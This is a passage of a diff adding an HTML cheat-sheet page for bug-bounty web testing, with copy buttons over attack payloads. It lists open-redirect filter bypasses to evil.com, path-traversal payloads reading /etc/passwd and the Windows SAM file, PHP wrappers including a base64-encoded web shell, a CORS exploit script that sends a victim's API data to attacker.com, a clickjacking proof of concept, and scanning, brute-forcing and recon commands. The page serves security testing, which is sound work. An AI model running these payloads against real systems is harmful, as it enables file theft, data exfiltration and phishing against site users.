+      <!-- OPEN REDIRECT -->
+      <div class="card" id="open-redirect">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-medium">Medium</span>
+          <h3>↗️ Open Redirect</h3>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Application redirects users to an attacker-controlled URL, often used in phishing or OAuth token theft.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>Find redirect parameters:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>Redirect Detection</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Common parameters
+?next=https://evil.com
+?url=https://evil.com
+?redirect=https://evil.com
+?return=https://evil.com
+?continue=https://evil.com
+?dest=https://evil.com
+?go=https://evil.com
+?rurl=https://evil.com
+
+# Path-based
+/login?next=/admin
+/logout?url=https://evil.com
+
+# OAuth abuse
+https://target.com/auth?redirect_uri=https://evil.com/callback
+https://target.com/oauth?callback=https://evil.com</code></pre>
+          </div>
+
+          <div class="step"><div class="step-num">2</div><div class="step-content"><strong>Bypass filters:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>Redirect Bypass</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Protocol-relative
+//evil.com
+
+# Subdomain trick
+https://target.com.evil.com
+https://evil.com%252ftarget.com
+
+# Special chars
+https://evil.com%00.target.com
+https://evil.com%0a.target.com
+https://target.com\@evil.com
+https://target.com#@evil.com
+
+# Backslash
+https://evil.com\@target.com
+
+# DNS manipulation
+https://evil.com#.target.com</code></pre>
+          </div>
+        </div>
+      </div>
+
+      <!-- LFI -->
+      <div class="card" id="lfi">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-medium">Medium</span>
+          <h3>📂 LFI / Path Traversal</h3>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Reading arbitrary files from the server by manipulating file path parameters.</p>
+
+          <div class="code-block">
+            <div class="code-header"><span>LFI Payloads</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Basic traversal
+../../../etc/passwd
+..%2f..%2f..%2fetc/passwd
+....//....//....//etc/passwd
+
+# Null byte (PHP < 5.3.4)
+../../../../etc/passwd%00
+
+# Double encoding
+..%252f..%252f..%252fetc/passwd
+
+# Windows
+..\..\..\windows\system32\config\sam
+
+# Filter bypass
+....\/....\/....\/etc/passwd
+..;/..;/..;/etc/passwd
+
+# PHP wrappers
+php://filter/convert.base64-encode/resource=index.php
+php://input
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs=
+
+# Log poisoning
+# Inject PHP into User-Agent, then LFI /var/log/apache2/access.log</code></pre>
+          </div>
+        </div>
+      </div>
+
+      <!-- CORS -->
+      <div class="card" id="cors">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-medium">Medium</span>
+          <h3>🌐 CORS Misconfiguration</h3>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Improper CORS headers allowing cross-origin requests from attacker domains, leading to data theft.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>Test CORS:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>CORS Testing</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Check if Origin is reflected
+curl -H "Origin: https://evil.com" https://target.com/api/user -v
+
+# Dangerous headers to look for:
+Access-Control-Allow-Origin: https://evil.com
+Access-Control-Allow-Credentials: true
+
+# Null origin bypass
+curl -H "Origin: null" https://target.com/api/user</code></pre>
+          </div>
+
+          <div class="step"><div class="step-num">2</div><div class="step-content"><strong>Exploit:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>CORS Exploit</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code>&lt;script&gt;
+var req = new XMLHttpRequest();
+req.onload = function() {
+  // Exfiltrate response
+  new Image().src = "https://attacker.com/steal?data=" + req.responseText;
+};
+req.open("GET", "https://target.com/api/user-data", true);
+req.withCredentials = true;
+req.send();
+&lt;/script&gt;</code></pre>
+          </div>
+        </div>
+      </div>
+
+      <!-- INFO DISCLOSURE -->
+      <div class="card" id="info-disclosure">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-low">Low</span>
+          <h3>ℹ️ Information Disclosure</h3>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <div class="code-block">
+            <div class="code-header"><span>Recon Commands</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Check common paths
+/robots.txt
+/sitemap.xml
+/.env
+/.git/config
+/.git/HEAD
+/server-status
+/server-info
+/.DS_Store
+/debug/pprof/
+/actuator
+/actuator/env
+/swagger-ui.html
+/api-docs
+/graphql
+/.well-known/security.txt</code></pre>
+          </div>
+        </div>
+      </div>
+
+      <!-- CLICKJACKING -->
+      <div class="card" id="clickjacking">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-low">Low</span>
+          <h3>🖱️ Clickjacking</h3>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <div class="code-block">
+            <div class="code-header"><span>Clickjacking PoC</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code>&lt;html&gt;
+&lt;style&gt;
+  iframe {
+    position: relative;
+    width: 700px;
+    height: 500px;
+    opacity: 0.8;
+    z-index: 2;
+  }
+  .decoy {
+    position: absolute;
+    top: 200px;
+    left: 100px;
+    z-index: 1;
+  }
+&lt;/style&gt;
+&lt;body&gt;
+  &lt;div class="decoy"&gt;Click here to win a prize!&lt;/div&gt;
+  &lt;iframe src="https://target.com/delete-account"&gt;&lt;/iframe&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+          </div>
+          <div class="note">Check for X-Frame-Options and Content-Security-Policy frame-ancestors headers.</div>
+        </div>
+      </div>
+
+      <!-- SECURITY HEADERS -->
+      <div class="card" id="headers">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-info" style="background:var(--accent);color:#000">Info</span>
+          <h3>🔒 Security Headers Checklist</h3>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <div class="code-block">
+            <div class="code-header"><span>Headers to Check</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Missing security headers
+Strict-Transport-Security (HSTS)
+Content-Security-Policy (CSP)
+X-Content-Type-Options: nosniff
+X-Frame-Options: DENY
+X-XSS-Protection: 0
+Referrer-Policy: no-referrer
+Permissions-Policy
+Cache-Control: no-store
+
+# Check with curl
+curl -sI https://target.com | grep -iE "strict|content-security|x-frame|x-content|x-xss|referrer|permissions"</code></pre>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- ==================== RECON TAB ==================== -->
+    <div class="tab-content" id="tab-recon">
+
+      <div class="card" id="recon">
+        <div class="card-header" onclick="toggleCard(this)">
+          <h3>🔍 Recon Commands</h3>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <div class="code-block">
+            <div class="code-header"><span>Subdomain Enumeration</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Subfinder
+subfinder -d target.com -all -o subs.txt
+
+# Amass
+amass enum -passive -d target.com -o subs_amass.txt
+
+# Assetfinder
+assetfinder --subs-only target.com > subs_asset.txt
+
+# Combine & sort
+cat subs.txt subs_amass.txt subs_asset.txt | sort -u > all_subs.txt
+
+# DNS resolution
+cat all_subs.txt | dnsx -silent -a -resp-only > alive.txt
+
+# httpx - find live hosts
+cat alive.txt | httpx -silent -status-code -title -tech-detect -o live.txt</code></pre>
+          </div>
+
+          <div class="code-block">
+            <div class="code-header"><span>Port Scanning</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Naabu (fast port scan)
+cat alive.txt | naabu -top-ports 1000 -silent -o ports.txt
+
+# Nmap
+nmap -sC -sV -p- target.com -oA nmap_full
+nmap -sU --top-ports 100 target.com</code></pre>
+          </div>
+
+          <div class="code-block">
+            <div class="code-header"><span>Directory Bruteforcing</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Feroxbuster (recursive)
+feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,js -o dirs.txt
+
+# ffuf
+ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -mc 200,301,302,403
+
+# gobuster
+gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,js</code></pre>
+          </div>
+
+          <div class="code-block">
+            <div class="code-header"><span>JavaScript Analysis</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># LinkFinder
+python3 linkfinder.py -i https://target.com -o cli
+
+# SecretFinder
+python3 SecretFinder.py -i https://target.com/app.js -o cli
+
+# Find interesting strings in JS
+cat js_files.txt | xargs grep -lE "(api[_-]?key|secret|token|password|auth|aws|firebase)" 2>/dev/null
+
+# Get JS files
+cat live.txt | waybackurls | grep "\.js$" | sort -u > js_files.txt</code></pre>
+          </div>
+
+          <div class="code-block">
+            <div class="code-header"><span>URL Collection</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Wayback Machine
+cat all_subs.txt | waybackurls > wayback.txt
+
+# GAU (GetAllUrls)
+cat all_subs.txt | gau --threads 5 > gau.txt
+
+# Combine & filter
+cat wayback.txt gau.txt | sort -u > all_urls.txt
+
+# Find interesting params
+cat all_urls.txt | grep "=" | sort -u > params.txt
+
+# Find endpoints with specific extensions
+cat all_urls.txt | grep -E "\.(php|asp|aspx|jsp|json|xml)" > api_endpoints.txt</code></pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="card" id="tools">
+        <div class="card-header" onclick="toggleCard(this)">
+          <h3>🛠️ Tool Installation</h3>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <div class="code-block">
+            <div class="code-header"><span>Essential Tools</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Go tools
+go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
+go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
+go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
+go install github.com/ffuf/ffuf/v2@latest
+go install github.com/tomnomnom/waybackurls@latest
+go install github.com/lc/gau/v2/cmd/gau@latest
+go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest
+go install github.com/projectdiscovery/katana/cmd/katana@latest
+go install github.com/sensepost/gowitness@latest
+
+# Python tools
+pip install sqlmap
+pip install SecretFinder
+pip install linkfinder
+pip install xsstrike
+pip install Arjun
+
+# Other
+git clone https://github.com/s0md3v/XSStrike.git && cd XSStrike && pip install -r requirements.txt
+git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git
+git clone https://github.com/danielmiessler/SecLists.git</code></pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="card" id="wordlists">
+        <div class="card-header" onclick="toggleCard(this)">
+          <h3>📚 Wordlists</h3>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <div class="code-block">
+            <div class="code-header"><span>SecLists Paths</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Discovery
+/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
+/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
+/usr/share/seclists/Discovery/Web-Content/common.txt
+/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+
+# Fuzzing
+/usr/share/seclists/Fuzzing/special-chars.txt
+/usr/share/seclists/Fuzzing/LFI/Linux-lfi-bypass-protection.txt
+
+# Passwords
+/usr/share/seclists/Passwords/Common-Credentials/best1050.txt
+/usr/share/seclists/Usernames/top-usernames-shortlist.txt</code></pre>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- ==================== WORKSPACE TAB ==================== -->
+    <div class="tab-content" id="tab-workspace">
+
+      <div class="card" id="scratchpad">
+        <div class="card-header" onclick="toggleCard(this)">
+          <h3>📝 Scratchpad</h3>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body open">
+          <textarea class="scratchpad" id="notepad" placeholder="Type notes here... (auto-saved to localStorage)"></textarea>
+          <div style="margin-top:8px;display:flex;gap:8px;">
+            <button class="copy-btn" onclick="clearNotepad()" style="padding:6px 14px">Clear</button>
+            <button class="copy-btn" onclick="exportNotepad()" style="padding:6px 14px">Export</button>
+          </div>
+        </div>
+      </div>
+
+      <div class="card" id="checklist">
+        <div class="card-header" onclick="toggleCard(this)">
+          <h3>✅ Bug Bounty Checklist</h3>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body open">
+          <div id="checklist-content">
+            <label><input type="checkbox" class="check-item"> Scope defined (in-scope domains/IPs)</label><br>
+            <label><input type="checkbox" class="check-item"> Subdomain enumeration complete</label><br>
+            <label><input type="checkbox" class="check-item"> Live hosts identified</label><br>
+            <label><input type="checkbox" class="check-item"> Port scan done</label><br>
+            <label><input type="checkbox" class="check-item"> Directory brute-force complete</label><br>
+            <label><input type="checkbox" class="check-item"> JavaScript files analyzed</label><br>
+            <label><input type="checkbox" class="check-item"> API endpoints mapped</label><br>
+            <label><input type="checkbox" class="check-item"> Technology fingerprinted</label><br>
+            <label><input type="checkbox" class="check-item"> Sensitive files checked (.env, .git, robots.txt)</label><br>
+            <label><input type="checkbox" class="check-item"> Authentication tested</label><br>
+            <label><input type="checkbox" class="check-item"> All input points tested for injection</label><br>
+            <label><input type="checkbox" class="check-item"> Access control / IDOR tested</label><br>
+            <label><input type="checkbox" class="check-item"> CORS tested</label><br>
+            <label><input type="checkbox" class="check-item"> Security headers reviewed</label><br>
+            <label><input type="checkbox" class="check-item"> Rate limiting tested</label><br>
+            <label><input type="checkbox" class="check-item"> Business logic tested</label><br>
+            <label><input type="checkbox" class="check-item"> Findings documented & reported</label><br>
+          </div>
+          <div style="margin-top:10px">
+            <button class="copy-btn" onclick="resetChecklist()" style="padding:6px 14px">Reset All</button>
+          </div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-header" onclick="toggleCard(this)">
+          <h3>📋 Quick Reference — HTTP Methods to Test</h3>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <div class="code-block">
+            <div class="code-header"><span>HTTP Methods</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Always test these methods on every endpoint
+GET / POST / PUT / PATCH / DELETE / OPTIONS / HEAD
+
+# Check for method-based access control bypass
+# GET /admin → 403
+# POST /admin → 200
+
+# Check for TRACE method (XST)
+TRACE /api/endpoint
+
+# Headers to test
+X-HTTP-Method-Override: DELETE
+X-Method-Override: DELETE
+X-HTTP-Method: DELETE</code></pre>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+  </div>
+</div>
+
+<script>
+// Toggle cards
+function toggleCard(header) {
+  header.classList.toggle('open');
+  const body = header.nextElementSibling;
+  body.classList.toggle('open');
+}
+
+// Copy code
+function copyCode(btn) {
+  const code = btn.closest('.code-block').querySelector('code').textContent;
+  navigator.clipboard.writeText(code).then(() => {
+    btn.textContent = 'Copied!';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+  });
+}
+
+// Tab switching
+function switchTab(name) {
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+  event.target.classList.add('active');
+  document.getElementById('tab-' + name).classList.add('active');
+}
+
+// Search filter
+function filterContent() {
+  const query = document.getElementById('searchBox').value.toLowerCase();
+  document.querySelectorAll('.card').forEach(card => {
+    const text = card.textContent.toLowerCase();
+    card.style.display = text.includes(query) ? '' : 'none';
+  });
+}
+
+// Notepad auto-save
+const notepad = document.getElementById('notepad');
+notepad.value = localStorage.getItem('bugbounty-notes') || '';
+notepad.addEventListener('input', () => localStorage.setItem('bugbounty-notes', notepad.value));
+
+function clearNotepad() { notepad.value = ''; localStorage.removeItem('bugbounty-notes'); }
+function exportNotepad() {
+  const blob = new Blob([notepad.value], {type: 'text/plain'});
+  const a = document.createElement('a'); a.href = URL.createObjectURL(blob);
+  a.download = 'bugbounty-notes.txt'; a.click();
+}
+
+// Checklist save
+document.querySelectorAll('.check-item').forEach((cb, i) => {
+  cb.checked = localStorage.getItem('check-' + i) === 'true';
+  cb.addEventListener('change', () => localStorage.setItem('check-' + i, cb.checked));
+});
+function resetChecklist() {
+  document.querySelectorAll('.check-item').forEach((cb, i) => { cb.checked = false; localStorage.removeItem('check-' + i); });
+}
+
+// Open all cards by default
+document.querySelectorAll('.card-body').forEach(b => b.classList.add('open'));
+document.querySelectorAll('.card-header').forEach(h => h.classList.add('open'));
+</script>
+
+</body>
+</html>
